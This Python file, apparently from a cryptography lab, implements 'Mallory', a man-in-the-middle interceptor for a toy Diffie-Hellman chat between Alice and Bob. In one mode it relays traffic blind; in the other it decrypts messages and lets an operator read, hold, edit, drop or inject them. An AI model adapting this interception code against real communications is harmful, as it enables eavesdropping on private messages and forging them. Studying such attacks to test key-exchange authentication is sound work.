# mallory.py
import socket, threading, os, base64, re, sys, time
from utils import send_obj, recv_obj
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# DH params (same as Alice/Bob)
p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1
g = 2
LISTEN_PORT = 5000
BOB_IP = "192.168.15.137"
BOB_PORT = 5000

# Gatekeeper flag
gatekeeper = False
mode = "relay"  # "relay" (default) or "mitm"

# pending queues: each entry is {"text": str, "send_func": callable}
pending = {
    "alice": [],
    "bob": []
}
pend_lock = threading.Lock()

def derive_key_from_int(shared_int):
    bs = shared_int.to_bytes((shared_int.bit_length()+7)//8 or 1, "big")
    hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b"dh-chat")
    return hkdf.derive(bs)

def dh_priv(): return int.from_bytes(os.urandom(32), "big") % (p-2) + 2
def dh_pub(priv): return pow(g, priv, p)
def dh_shared(pub, priv): return pow(pub, priv, p)

def parse_quoted(cmd: str):
    m = re.search(r'"(.*)"', cmd)
    return m.group(1) if m else None

# session state for operator console and injection
current_session = {
    "alice_sock": None,
    "bob_sock": None,
    "aes_a": None,   # AES to talk to Alice (Mallory->Alice)
    "aes_b": None    # AES to talk to Bob (Mallory->Bob)
}

session_lock = threading.Lock()

def set_session(a_sock, b_sock, aes_a, aes_b):
    with session_lock:
        current_session["alice_sock"] = a_sock
        current_session["bob_sock"] = b_sock
        current_session["aes_a"] = aes_a
        current_session["aes_b"] = aes_b

def clear_session():
    with session_lock:
        current_session["alice_sock"] = None
        current_session["bob_sock"] = None
        current_session["aes_a"] = None
        current_session["aes_b"] = None

def handle_command(line: str):
    global gatekeeper, mode
    line = line.strip()
    if not line:
        return

    if line.lower() == "/gatekeeper on":
        gatekeeper = True
        print("[MALLORY] Gatekeeper ENABLED")
        return
    if line.lower() == "/gatekeeper off":
        gatekeeper = False
        print("[MALLORY] Gatekeeper DISABLED")
        # flush pending
        with pend_lock:
            while pending["alice"]:
                item = pending["alice"].pop(0)
                item["send_func"](item["text"])
                print(f'[MALLORY]: *Forwarded* - [ALICE->BOB] {item["text"]}')
            while pending["bob"]:
                item = pending["bob"].pop(0)
                item["send_func"](item["text"])
                print(f'[MALLORY]: *Forwarded* - [BOB->ALICE] {item["text"]}')
        return

    if line.startswith("/mode "):
        parts = line.split()
        if len(parts) < 2:
            print("[MALLORY] Usage: /mode relay|mitm")
            return
        new = parts[1].lower()
        if new not in ("relay", "mitm"):
            print("[MALLORY] Unknown mode:", new)
            return
        mode = new
        print(f"[MALLORY] Mode set to {mode.upper()}")
        return

    # /msg target "text"
    if line.startswith("/msg "):
        parts = line.split(" ", 2)
        if len(parts) < 3:
            print('[MALLORY] Usage: /msg alice "text"')
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Target must be alice or bob")
            return
        text = parse_quoted(line)
        if text is None:
            print('[MALLORY] /msg requires quoted text: /msg alice "hello"')
            return
        with session_lock:
            aes = current_session["aes_a"] if target=="alice" else current_session["aes_b"]
            sock = current_session["alice_sock"] if target=="alice" else current_session["bob_sock"]
        if aes is None or sock is None:
            print("[MALLORY] No AES session available for injection (need MITM mode and active session).")
            return
        nonce = os.urandom(12)
        ct = aes.encrypt(nonce, text.encode(), None)
        send_obj(sock, {
            "type": "encrypted",
            "nonce": base64.b64encode(nonce).decode(),
            "ct": base64.b64encode(ct).decode()
        })
        print(f'[MALLORY]: *Injected* - [{target.upper()}] {text}')
        return

    # /edit target "text"
    if line.startswith("/edit "):
        parts = line.split(" ", 2)
        if len(parts) < 3:
            print('[MALLORY] Usage: /edit alice "text"')
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        text = parse_quoted(line)
        if text is None:
            print('[MALLORY] /edit requires quoted text')
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to edit")
                return
            item = queue.pop(0)
        item["send_func"](text)
        print(f'[MALLORY]: *Edited* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {text}')
        return

    # /drop
    if line.startswith("/drop "):
        parts = line.split()
        if len(parts) < 2:
            print("[MALLORY] Usage: /drop alice")
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to drop")
                return
            item = queue.pop(0)
        print(f'[MALLORY]: *Dropped* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {item["text"]}')
        return

    # /forward
    if line.startswith("/forward "):
        parts = line.split()
        if len(parts) < 2:
            print("[MALLORY] Usage: /forward alice")
            return
        target = parts[1].lower()
        if target not in ("alice", "bob"):
            print("[MALLORY] Choose alice or bob")
            return
        with pend_lock:
            queue = pending[target]
            if not queue:
                print(f"[MALLORY] No pending {target} messages to forward")
                return
            item = queue.pop(0)
        item["send_func"](item["text"])
        print(f'[MALLORY]: *Forwarded* - [{target.upper()}->{"BOB" if target=="alice" else "ALICE"}] {item["text"]}')
        return

    print("[MALLORY] Unknown command")

# session_senders kept for backward compatibility
session_senders = {}

def handle_client(alice_sock, addr):
    """
    Handles one Alice connection. Supports two strategies:
      - relay: forward Alice's cert+dh to Bob, forward Bob's cert+dh to Alice,
               then transparent relay of ciphertext (Mallory is blind)
      - mitm: perform separate DH with Alice and Bob (classic MITM).
              This will only succeed if Mallory can supply certs/signatures
              that Alice/Bob accept.
    """
    global current_session, mode
    thread_id = threading.current_thread().ident
    print("[Mallory] Alice connected from", addr)

    try:
        # receive Alice's initial dh_pub message (which includes cert + signature)
        m = recv_obj(alice_sock)
        if not m:
            print("[Mallory] no data from Alice")
            alice_sock.close()
            return
        if m.get("type") != "dh_pub":
            print("[Mallory] Expected dh_pub from Alice, got:", m.get("type"))
            alice_sock.close()
            return

        # extract what Alice sent
        a_pub_str = m.get("pub")
        alice_cert_pem = m.get("cert")       # PEM string
        alice_signature = m.get("signature") # base64

        print("[Mallory] Received from Alice: dh_pub + cert + signature (logged).")

        # Mode: RELAY (transparent)
        if mode == "relay":
            # connect to Bob
            bob_sock = socket.create_connection((BOB_IP, BOB_PORT))
            print("[Mallory] Connected to Bob (relay mode).")

            # forward Alice's dh_pub message (unchanged) to Bob
            send_obj(bob_sock, {
                "type": "dh_pub",
                "pub": a_pub_str,
                "cert": alice_cert_pem,
                "signature": alice_signature
            })
            print("[Mallory] Forwarded Alice's dh_pub+cert to Bob.")

            # receive Bob's response (dh_pub + cert + signature)
            m2 = recv_obj(bob_sock)
            if not m2 or m2.get("type") != "dh_pub":
                print("[Mallory] Expected dh_pub from Bob, got:", m2)
                bob_sock.close()
                alice_sock.close()
                return

            b_pub_str = m2.get("pub")
            bob_cert_pem = m2.get("cert")
            bob_signature = m2.get("signature")
            print("[Mallory] Received dh_pub+cert from Bob; forwarding to Alice.")

            # forward Bob's response to Alice unchanged
            send_obj(alice_sock, {
                "type": "dh_pub",
                "pub": b_pub_str,
                "cert": bob_cert_pem,
                "signature": bob_signature
            })
            print("[Mallory] Forwarded Bob's dh_pub+cert to Alice.")

            # set session globals: in relay mode Mallory does NOT have AES keys (blind)
            set_session(alice_sock, bob_sock, None, None)
            session_senders[thread_id] = {"send_to_alice": None, "send_to_bob": None}

            # now transparent forwarding of encrypted messages; gatekeeper still works
            def forward(src, dst, origin):
                try:
                    while True:
                        pkt = recv_obj(src)
                        if pkt is None:
                            break
                        # if it's encrypted, we cannot decrypt (blind), but we can hold/drop/forward
                        if pkt.get("type") == "encrypted":
                            # hold or forward depending on gatekeeper
                            if not gatekeeper:
                                send_obj(dst, pkt)
                                print(f"[Mallory] Forwarded encrypted [{origin}]")
                            else:
                                # store the ciphertext string as text for operator (can't decrypt)
                                with pend_lock:
                                    # store the raw pkt and function to forward unchanged
                                    pending[ origin.lower() ].append({
                                        "text": "<ciphertext>",
                                        "raw": pkt,
                                        "send_func": lambda to_send_pkt=dst, p=pkt: send_obj(to_send_pkt, p)
                                    })
                                print(f"[MALLORY] Intercepted and HELD - [{origin}] <ciphertext>")
                        elif pkt.get("type") == "close":
                            send_obj(dst, {"type": "close"})
                            break
                        else:
                            # other message types forwarded
                            send_obj(dst, pkt)
                except Exception as e:
                    print("[Mallory] forward ended:", e)

            t1 = threading.Thread(target=forward, args=(alice_sock, bob_sock, "ALICE"), daemon=True)
            t2 = threading.Thread(target=forward, args=(bob_sock, alice_sock, "BOB"), daemon=True)
            t1.start(); t2.start()
            t1.join(); t2.join()

            # cleanup
            session_senders.pop(thread_id, None)
            clear_session()
            bob_sock.close()
            alice_sock.close()
            print("[Mallory] Relay session ended.")
            return

        # Mode: MITM attempt
        elif mode == "mitm":
            # Mallory will attempt to perform DH with both sides.
            # Note: if Alice/Bob verify certificates & signatures properly, they will
            # detect that Mallory is not Bob/Alice unless Mallory has valid certs.
            print("[Mallory] MITM mode selected: attempting separate DH with each side.")

            # Parse Alice's DH public
            try:
                a_pub = int(a_pub_str)
            except Exception:
                print("[Mallory] invalid Alice pub")
                alice_sock.close()
                return

            # Mallory acts as Bob to Alice: generate own DH and send to Alice
            a_priv_m = dh_priv(); a_pub_m = dh_pub(a_priv_m)
            # Mallory could send a cert+signature here pretending to be Bob; but unless she
            # has a valid cert signed by the CA, Alice should reject. We'll send a 'dh_pub'
            # in the same format but note: likely to fail verification on Alice side.
            # For our test, we'll send Mallory's own 'dh_pub' without pretending to be Bob's real cert.
            # You can extend this to load mallory.cert/key if you want to test successful impersonation.
            send_obj(alice_sock, {"type": "dh_pub", "pub": str(a_pub_m),
                                  "cert": "", "signature": ""})
            shared_a = dh_shared(a_pub, a_priv_m)
            aes_a = AESGCM(derive_key_from_int(shared_a))
            print("[Mallory] DH established with Alice (if Alice accepted).")

            # Now act as Alice to Bob: connect and send Mallory->Bob DH
            bob_sock = socket.create_connection((BOB_IP, BOB_PORT))
            b_priv_m = dh_priv(); b_pub_m = dh_pub(b_priv_m)
            # send to Bob: pretending to be Alice (we include Alice's cert if we want to forward it,
            # but a proper MITM would send Mallory's cert signed by CA to Bob)
            # Here we forward Alice's cert to Bob while sending our own pub to Bob
            send_obj(bob_sock, {"type": "dh_pub", "pub": str(b_pub_m),
                                "cert": alice_cert_pem, "signature": alice_signature})
            # receive Bob's response
            m2 = recv_obj(bob_sock)
            if not m2 or m2.get("type") != "dh_pub":
                print("[Mallory] Unexpected response from Bob:", m2)
                bob_sock.close(); alice_sock.close(); return
            b_pub_str = m2.get("pub")
            try:
                b_pub = int(b_pub_str)
            except:
                print("[Mallory] invalid Bob pub")
                bob_sock.close(); alice_sock.close(); return
            shared_b = dh_shared(b_pub, b_priv_m)
            aes_b = AESGCM(derive_key_from_int(shared_b))
            print("[Mallory] DH established with Bob (if Bob accepted).")

            # Save session (we have AES contexts both sides if handshakes succeeded)
            set_session(alice_sock, bob_sock, aes_a, aes_b)
            session_senders[thread_id] = {"send_to_alice": lambda t: None, "send_to_bob": lambda t: None}

            # Define send helpers using derived AES contexts
            def send_to_alice(text):
                nonce = os.urandom(12)
                ct = aes_a.encrypt(nonce, text.encode(), None)
                send_obj(alice_sock, {"type":"encrypted",
                                      "nonce": base64.b64encode(nonce).decode(),
                                      "ct": base64.b64encode(ct).decode()})
            def send_to_bob(text):
                nonce = os.urandom(12)
                ct = aes_b.encrypt(nonce, text.encode(), None)
                send_obj(bob_sock, {"type":"encrypted",
                                    "nonce": base64.b64encode(nonce).decode(),
                                    "ct": base64.b64encode(ct).decode()})

            session_senders[thread_id] = {"send_to_alice": send_to_alice, "send_to_bob": send_to_bob}

            # Relay decrypted plaintexts (Mallory can read them)
            def from_alice_plain():
                try:
                    while True:
                        pkt = recv_obj(alice_sock)
                        if not pkt:
                            break
                        if pkt.get("type") == "encrypted":
                            nonce = base64.b64decode(pkt["nonce"])
                            pt = aes_a.decrypt(nonce, base64.b64decode(pkt["ct"]), None).decode()
                            if not gatekeeper:
                                send_to_bob(pt)
                                print(f"[ALICE->BOB] {pt}")
                            else:
                                with pend_lock:
                                    pending["alice"].append({"text": pt, "send_func": send_to_bob})
                                print(f"[MALLORY] Intercepted and HELD - [ALICE->BOB] {pt}")
                        elif pkt.get("type") == "close":
                            send_obj(bob_sock, {"type": "close"})
                            break
                except Exception as e:
                    print("[Mallory] from_alice_plain ended:", e)

            def from_bob_plain():
                try:
                    while True:
                        pkt = recv_obj(bob_sock)
                        if not pkt:
                            break
                        if pkt.get("type") == "encrypted":
                            nonce = base64.b64decode(pkt["nonce"])
                            pt = aes_b.decrypt(nonce, base64.b64decode(pkt["ct"]), None).decode()
                            if not gatekeeper:
                                send_to_alice(pt)
                                print(f"[BOB->ALICE] {pt}")
                            else:
                                with pend_lock:
                                    pending["bob"].append({"text": pt, "send_func": send_to_alice})
                                print(f"[MALLORY] Intercepted and HELD - [BOB->ALICE] {pt}")
                        elif pkt.get("type") == "close":
                            send_obj(alice_sock, {"type": "close"})
                            break
                except Exception as e:
                    print("[Mallory] from_bob_plain ended:", e)

            t1 = threading.Thread(target=from_alice_plain, daemon=True)
            t2 = threading.Thread(target=from_bob_plain, daemon=True)
            t1.start(); t2.start()
            t1.join(); t2.join()

            # cleanup
            session_senders.pop(thread_id, None)
            clear_session()
            bob_sock.close()
            alice_sock.close()
            print("[Mallory] MITM session ended.")
            return

        else:
            print("[Mallory] unknown mode:", mode)
            alice_sock.close()
            return

    except Exception as e:
        print("[Mallory] handle_client error:", e)
        try:
            alice_sock.close()
        except:
            pass

def main():
    print("Available commands:")
    print("  /mode relay | /mode mitm")
    print("  /gatekeeper on|off")
    print('  /msg alice "text"  (requires AES session)')
    print('  /msg bob   "text"')
    print("  /forward alice|bob")
    print("  /drop alice|bob")
    print('  /edit alice|bob "text"')

    def console_loop():
        while True:
            try:
                line = input()
            except EOFError:
                break
            handle_command(line)

    threading.Thread(target=console_loop, daemon=True).start()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", LISTEN_PORT))
    s.listen(5)
    print("[Mallory] listening on port", LISTEN_PORT)

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
